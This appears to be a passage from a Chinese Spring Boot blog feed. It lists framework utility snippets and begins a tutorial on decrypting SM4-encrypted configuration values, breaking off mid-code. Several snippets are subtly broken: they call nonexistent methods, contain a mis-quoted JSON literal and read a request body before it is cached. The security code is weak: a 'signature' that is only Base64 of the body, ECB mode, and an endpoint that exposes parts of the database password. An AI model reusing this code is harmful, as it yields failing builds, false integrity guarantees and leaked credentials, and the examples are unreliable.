<h3 id="I-O和资源工具"><a href="#I-O和资源工具" class="headerlink" title="I&#x2F;O和资源工具"></a>I&#x2F;O和资源工具</h3><h4 id="FileCopyUtils"><a href="#FileCopyUtils" class="headerlink" title="FileCopyUtils"></a>FileCopyUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制文件内容</span></span><br><span class="line"><span class="type">byte</span>[] bytes = FileCopyUtils.copyToByteArray(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;input.txt&quot;</span>));</span><br><span class="line">FileCopyUtils.copy(bytes, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line"><span class="comment">// 读取文本</span></span><br><span class="line"><span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> FileCopyUtils.copyToString(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;input.txt&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">// 流复制</span></span><br><span class="line">FileCopyUtils.copy(inputStream, outputStream);</span><br></pre></td></tr></table></figure>
<h3 id="Web相关工具类"><a href="#Web相关工具类" class="headerlink" title="Web相关工具类"></a>Web相关工具类</h3><h4 id="WebUtils"><a href="#WebUtils" class="headerlink" title="WebUtils"></a>WebUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.util.WebUtils;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Cookie</span></span><br><span class="line"><span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> WebUtils.getCookie(request, <span class="string">&quot;sessionId&quot;</span>);</span><br><span class="line"><span class="comment">// 获取请求路径</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> WebUtils.getLookupPathForRequest(request);</span><br><span class="line"><span class="comment">// 从请求中获取参数</span></span><br><span class="line"><span class="type">int</span> <span class="variable">pageSize</span> <span class="operator">=</span> WebUtils.getIntParameter(request, <span class="string">&quot;pageSize&quot;</span>, <span class="number">10</span>);</span><br></pre></td></tr></table></figure>
<h4 id="UriUtils"><a href="#UriUtils" class="headerlink" title="UriUtils"></a>UriUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.util.UriUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编解码URI组件</span></span><br><span class="line"><span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> UriUtils.encodePathSegment(<span class="string">&quot;path with spaces&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">decoded</span> <span class="operator">=</span> UriUtils.decode(encoded, <span class="string">&quot;UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="验证和断言工具"><a href="#验证和断言工具" class="headerlink" title="验证和断言工具"></a>验证和断言工具</h3><h4 id="Assert"><a href="#Assert" class="headerlink" title="Assert"></a>Assert</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.Assert;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常用断言</span></span><br><span class="line">Assert.notNull(object, <span class="string">&quot;Object must not be null&quot;</span>);</span><br><span class="line">Assert.hasText(name, <span class="string">&quot;Name must not be empty&quot;</span>);</span><br><span class="line">Assert.isTrue(amount &gt; <span class="number">0</span>, <span class="string">&quot;Amount must be positive&quot;</span>);</span><br><span class="line">Assert.notEmpty(items, <span class="string">&quot;Items must not be empty&quot;</span>);</span><br><span class="line">Assert.state(isInitialized, <span class="string">&quot;Service is not initialized&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="ObjectUtils"><a href="#ObjectUtils" class="headerlink" title="ObjectUtils"></a>ObjectUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.ObjectUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象工具</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isEmpty</span> <span class="operator">=</span> ObjectUtils.isEmpty(<span class="literal">null</span>); <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isEmpty2</span> <span class="operator">=</span> ObjectUtils.isEmpty(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]); <span class="comment">// true</span></span><br><span class="line"><span class="type">String</span> <span class="variable">nullSafe</span> <span class="operator">=</span> ObjectUtils.nullSafeToString(<span class="literal">null</span>); <span class="comment">// &quot;null&quot;</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">equals</span> <span class="operator">=</span> ObjectUtils.nullSafeEquals(obj1, obj2);</span><br><span class="line"><span class="comment">// 默认值</span></span><br><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> ObjectUtils.getOrDefault(<span class="literal">null</span>, <span class="string">&quot;default&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="NumberUtils"><a href="#NumberUtils" class="headerlink" title="NumberUtils"></a>NumberUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.NumberUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字转换</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">parsed</span> <span class="operator">=</span> NumberUtils.parseNumber(<span class="string">&quot;42&quot;</span>, Integer.class);</span><br><span class="line"><span class="type">Double</span> <span class="variable">converted</span> <span class="operator">=</span> NumberUtils.convertNumberToTargetClass(<span class="number">42</span>, Double.class);</span><br></pre></td></tr></table></figure>
<h3 id="日期和时间工具"><a href="#日期和时间工具" class="headerlink" title="日期和时间工具"></a>日期和时间工具</h3><h4 id="DateTimeUtils"><a href="#DateTimeUtils" class="headerlink" title="DateTimeUtils"></a>DateTimeUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.format.datetime.DateTimeFormatUtils;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化日期</span></span><br><span class="line"><span class="type">String</span> <span class="variable">formatted</span> <span class="operator">=</span> DateTimeFormatUtils.getDateTimeInstance().format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br></pre></td></tr></table></figure>
<h4 id="StopWatch"><a href="#StopWatch" class="headerlink" title="StopWatch"></a>StopWatch</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.StopWatch;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计时工具</span></span><br><span class="line"><span class="type">StopWatch</span> <span class="variable">watch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>(<span class="string">&quot;TaskName&quot;</span>);</span><br><span class="line">watch.start(<span class="string">&quot;phase1&quot;</span>);</span><br><span class="line"><span class="comment">// 执行任务1</span></span><br><span class="line">Thread.sleep(<span class="number">100</span>);</span><br><span class="line">watch.stop();</span><br><span class="line">watch.start(<span class="string">&quot;phase2&quot;</span>);</span><br><span class="line"><span class="comment">// 执行任务2</span></span><br><span class="line">Thread.sleep(<span class="number">200</span>);</span><br><span class="line">watch.stop();</span><br><span class="line"><span class="comment">// 输出报告</span></span><br><span class="line">System.out.println(watch.prettyPrint());</span><br><span class="line">System.out.println(<span class="string">&quot;Total time: &quot;</span> + watch.getTotalTimeMillis() + <span class="string">&quot;ms&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="安全相关工具"><a href="#安全相关工具" class="headerlink" title="安全相关工具"></a>安全相关工具</h3><h4 id="Base64Utils"><a href="#Base64Utils" class="headerlink" title="Base64Utils"></a>Base64Utils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.Base64Utils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64编解码</span></span><br><span class="line"><span class="type">byte</span>[] data = <span class="string">&quot;Hello World&quot;</span>.getBytes();</span><br><span class="line"><span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> Base64Utils.encodeToString(data);</span><br><span class="line"><span class="type">byte</span>[] decoded = Base64Utils.decodeFromString(encoded);</span><br></pre></td></tr></table></figure>
<h3 id="JSON和数据转换工具"><a href="#JSON和数据转换工具" class="headerlink" title="JSON和数据转换工具"></a>JSON和数据转换工具</h3><h4 id="JsonUtils"><a href="#JsonUtils" class="headerlink" title="JsonUtils"></a>JsonUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.json.JsonParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.json.JsonParserFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JSON解析</span></span><br><span class="line"><span class="type">JsonParser</span> <span class="variable">parser</span> <span class="operator">=</span> JsonParserFactory.getJsonParser();</span><br><span class="line">Map&lt;String, Object&gt; parsed = parser.parseMap(<span class="string">&quot;&#123;&quot;</span>name<span class="string">&quot;:&quot;</span>John<span class="string">&quot;, &quot;</span>age<span class="string">&quot;:30&#125;&quot;</span>);</span><br><span class="line">List&lt;Object&gt; parsedList = parser.parseList(<span class="string">&quot;[1, 2, 3]&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="请求数据全链路追踪"><a href="#请求数据全链路追踪" class="headerlink" title="请求数据全链路追踪"></a>请求数据全链路追踪</h3><h4 id="CommonsRequestLoggingFilter"><a href="#CommonsRequestLoggingFilter" class="headerlink" title="CommonsRequestLoggingFilter"></a>CommonsRequestLoggingFilter</h4><p>在调试和监控阶段，记录请求的完整信息是定位问题的关键。Spring Boot 提供的 CommonsRequestLoggingFilter 可轻松实现请求数据的详细日志记录。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestLoggingConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CommonsRequestLoggingFilter <span class="title function_">logFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">CommonsRequestLoggingFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsRequestLoggingFilter</span>();</span><br><span class="line">        filter.setIncludeQueryString(<span class="literal">true</span>); <span class="comment">// 包含查询参数</span></span><br><span class="line">        filter.setIncludePayload(<span class="literal">true</span>);     <span class="comment">// 包含请求体</span></span><br><span class="line">        filter.setMaxPayloadLength(<span class="number">1024</span>);   <span class="comment">// 限制请求体日志长度（避免大字段溢出）</span></span><br><span class="line">        filter.setAfterMessagePrefix(<span class="string">&quot;[REQUEST DATA] &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> filter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>在 application.properties 中开启 DEBUG 级日志 中开启 DEBUG 级日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logging.level.org.springframework.web.filter.CommonsRequestLoggingFilter=DEBUG</span><br></pre></td></tr></table></figure>
<h3 id="请求响应灵活操控"><a href="#请求响应灵活操控" class="headerlink" title="请求响应灵活操控"></a>请求响应灵活操控</h3><h4 id="内容缓存包装器"><a href="#内容缓存包装器" class="headerlink" title="内容缓存包装器"></a>内容缓存包装器</h4><p>原生 HttpServletRequest 和 HttpServletResponse 的输入输出流仅支持单次读取，这在需要多次处理数据（如日志记录与业务逻辑分离）时存在局限。Spring 提供的 ContentCachingRequestWrapper 和 ContentCachingResponseWrapper 完美解决了这一问题</p>
<ul>
<li>请求包装器（ContentCachingRequestWrapper） ： 缓存请求体字节数据，允许多次读取。典型场景：记录请求日志后，控制器仍能正常解析请求体。</li>
<li>响应包装器（ContentCachingResponseWrapper） ： 缓存响应输出流，支持在响应提交前修改内容（如添加签名、动态拼接数据）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求包装器过滤器</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">publicclass RequestLogFilter <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 包装请求，缓存输入流</span></span><br><span class="line">        <span class="type">ContentCachingRequestWrapper</span> <span class="variable">wrappedRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentCachingRequestWrapper</span>(request);</span><br><span class="line">        <span class="type">byte</span>[] requestBody = wrappedRequest.getContentAsByteArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 记录请求日志（可在此处添加自定义逻辑）</span></span><br><span class="line">        log.debug(<span class="string">&quot;Received request body: &#123;&#125;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(requestBody));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 传递包装后的请求，确保后续组件能重复读取</span></span><br><span class="line">        filterChain.doFilter(wrappedRequest, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 响应包装器过滤器</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">publicclass ResponseSignFilter <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 包装响应，缓存输出流</span></span><br><span class="line">        <span class="type">ContentCachingResponseWrapper</span> <span class="variable">wrappedResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentCachingResponseWrapper</span>(response);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 执行后续处理（控制器逻辑）</span></span><br><span class="line">        filterChain.doFilter(request, wrappedResponse);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 响应后处理：添加签名</span></span><br><span class="line">        <span class="type">byte</span>[] responseBody = wrappedResponse.getContentAsByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> generateSignature(responseBody);</span><br><span class="line">        wrappedResponse.setHeader(<span class="string">&quot;X-Response-Signature&quot;</span>, signature);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 必须调用此方法将缓存内容写入原始响应</span></span><br><span class="line">        wrappedResponse.copyBodyToResponse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">generateSignature</span><span class="params">(<span class="type">byte</span>[] body)</span> &#123;</span><br><span class="line">        <span class="comment">// 自定义签名逻辑</span></span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(body);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AOP-开发助力"><a href="#AOP-开发助力" class="headerlink" title="AOP 开发助力"></a>AOP 开发助力</h3><h4 id="AopContext：代理对象访问器"><a href="#AopContext：代理对象访问器" class="headerlink" title="AopContext：代理对象访问器"></a>AopContext：代理对象访问器</h4><p>当同一类中方法调用导致注解（如 @Transactional）失效时，AopContext.currentProxy() 可获取当前代理对象，确保切面逻辑正确触发：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceImpl</span> &#123;</span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">innerMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 正常事务逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">outerMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 直接调用 innerMethod 会跳过代理，导致事务失效</span></span><br><span class="line">        <span class="comment">// 正确方式：通过代理对象调用</span></span><br><span class="line">        ((ServiceImpl) AopContext.currentProxy()).innerMethod();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="AopUtils：代理类型判断工具"><a href="#AopUtils：代理类型判断工具" class="headerlink" title="AopUtils：代理类型判断工具"></a>AopUtils：代理类型判断工具</h4><p>提供静态方法快速识别代理类型，便于动态处理不同代理逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (AopUtils.isJdkDynamicProxy(proxyObject)) &#123;</span><br><span class="line">    <span class="comment">// 处理 JDK 动态代理</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (AopUtils.isCglibProxy(proxyObject)) &#123;</span><br><span class="line">    <span class="comment">// 处理 CGLIB 代理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot集成九【自定义加密解密】</title>
    <url>/cnblogs.github.io/p/5beb.html</url>
    <content><![CDATA[<h3 id="1-实现思路"><a href="#1-实现思路" class="headerlink" title="1. 实现思路"></a>1. 实现思路</h3><p>SpringBoot启动时会加载配置文件，我们可以通过自定义PropertySource，在配置被读取前进行解密。</p>
<h3 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2. 代码实现"></a>2. 代码实现</h3><h4 id="第一步：创建加密工具类"><a href="#第一步：创建加密工具类" class="headerlink" title="第一步：创建加密工具类"></a>第一步：创建加密工具类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.config.encrypt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.bouncycastle.jce.provider.BouncyCastleProvider;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.Security;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 国密SM4加密工具类</span></span><br><span class="line"><span class="comment"> * 依赖bcprov-jdk15on</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SM4Utils</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Security.addProvider(<span class="keyword">new</span> <span class="title class_">BouncyCastleProvider</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALGORITHM_NAME</span> <span class="operator">=</span> <span class="string">&quot;SM4&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALGORITHM_NAME_ECB_PADDING</span> <span class="operator">=</span> <span class="string">&quot;SM4/ECB/PKCS7Padding&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> SecretKeySpec secretKeySpec;</span><br><span class="line">    <span class="keyword">private</span> Cipher cipher;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SM4Utils</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            secretKeySpec = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key.getBytes(), ALGORITHM_NAME);</span><br><span class="line">            cipher = Cipher.getInstance(ALGORITHM_NAME_ECB_PADDING, <span class="string">&quot;BC&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;初始化SM4加密工具失败&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encrypt</span><span class="params">(String plainText)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);</span><br><span class="line">            <span class="type">byte</span>[] encrypted = cipher.doFinal(plainText.getBytes());</span><br><span class="line">            <span class="keyword">return</span> Base64.getEncoder().encodeToString(encrypted);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;SM4加密失败&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decrypt</span><span class="params">(String cipherText)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);</span><br><span class="line">            <span class="type">byte</span>[] decrypted = cipher.doFinal(Base64.getDecoder().decode(cipherText));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decrypted);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;SM4解密失败&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第二步：创建自定义PropertySource"><a href="#第二步：创建自定义PropertySource" class="headerlink" title="第二步：创建自定义PropertySource"></a>第二步：创建自定义PropertySource</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.config.encrypt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.core.env.PropertySource;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义加密配置源</span></span><br><span class="line"><span class="comment"> * 解密以&quot;sm4:&quot;开头的配置项</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sm4EncryptedPropertySource</span> <span class="keyword">extends</span> <span class="title class_">PropertySource</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PropertySource&lt;?&gt; source;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SM4Utils sm4Utils;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Sm4EncryptedPropertySource</span><span class="params">(String name, PropertySource&lt;?&gt; source, String key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">        <span class="built_in">this</span>.source = source;</span><br><span class="line">        <span class="built_in">this</span>.sm4Utils = <span class="keyword">new</span> <span class="title class_">SM4Utils</span>(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> source.getProperty(name);</span><br><span class="line">        <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">strValue</span> <span class="operator">=</span> (String) value;</span><br><span class="line">            <span class="comment">// 解密以&quot;sm4:&quot;开头的配置</span></span><br><span class="line">            <span class="keyword">if</span> (strValue.startsWith(<span class="string">&quot;sm4:&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cipherText</span> <span class="operator">=</span> strValue.substring(<span class="number">4</span>);</span><br><span class="line">                <span class="keyword">return</span> sm4Utils.decrypt(cipherText);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第三步：注册PropertySource"><a href="#第三步：注册PropertySource" class="headerlink" title="第三步：注册PropertySource"></a>第三步：注册PropertySource</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.config.encrypt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.env.EnvironmentPostProcessor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.env.ConfigurableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.env.MutablePropertySources;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.env.PropertySource;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 环境后置处理器，注册自定义PropertySource</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncryptedEnvironmentPostProcessor</span> <span class="keyword">implements</span> <span class="title class_">EnvironmentPostProcessor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postProcessEnvironment</span><span class="params">(ConfigurableEnvironment environment, SpringApplication application)</span> &#123;</span><br><span class="line">        <span class="type">MutablePropertySources</span> <span class="variable">propertySources</span> <span class="operator">=</span> environment.getPropertySources();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从环境变量获取SM4密钥</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sm4Key</span> <span class="operator">=</span> environment.getProperty(<span class="string">&quot;SM4_KEY&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sm4Key == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;环境变量SM4_KEY未配置&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 遍历所有PropertySource，包装需要解密的配置</span></span><br><span class="line">        <span class="keyword">for</span> (PropertySource&lt;?&gt; source : propertySources) &#123;</span><br><span class="line">            <span class="keyword">if</span> (source.getName().contains(<span class="string">&quot;application.yaml&quot;</span>)) &#123;</span><br><span class="line">                propertySources.replace(source.getName(), </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Sm4EncryptedPropertySource</span>(source.getName(), source, sm4Key));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第四步：配置spring-factories"><a href="#第四步：配置spring-factories" class="headerlink" title="第四步：配置spring.factories"></a>第四步：配置spring.factories</h4><p>在src&#x2F;main&#x2F;resources&#x2F;META-INF&#x2F;spring.factories中注册后置处理器：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">org.springframework.boot.env.EnvironmentPostProcessor=\</span></span><br><span class="line"><span class="string">com.example.config.encrypt.EncryptedEnvironmentPostProcessor</span></span><br></pre></td></tr></table></figure>
<p>在配置文件中用sm4:前缀标识需要加密的配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">sm4:加密后的密文</span>  <span class="comment"># 用SM4加密</span></span><br></pre></td></tr></table></figure>
<p>启动时传入密钥：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SM4_KEY=你的密钥 </span><br><span class="line">java -jar app.jar</span><br></pre></td></tr></table></figure>

<h4 id="第五步：验证方法"><a href="#第五步：验证方法" class="headerlink" title="第五步：验证方法"></a>第五步：验证方法</h4><p>部署后一定要验证配置是否解密成功，可以写个简单的接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigTestController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String dbPassword;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test/config&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 打印脱敏后的密码（只显示前3位和后3位）</span></span><br><span class="line">        <span class="keyword">if</span> (dbPassword.length() &gt; <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;密码解密成功：&quot;</span> + dbPassword.substring(<span class="number">0</span>, <span 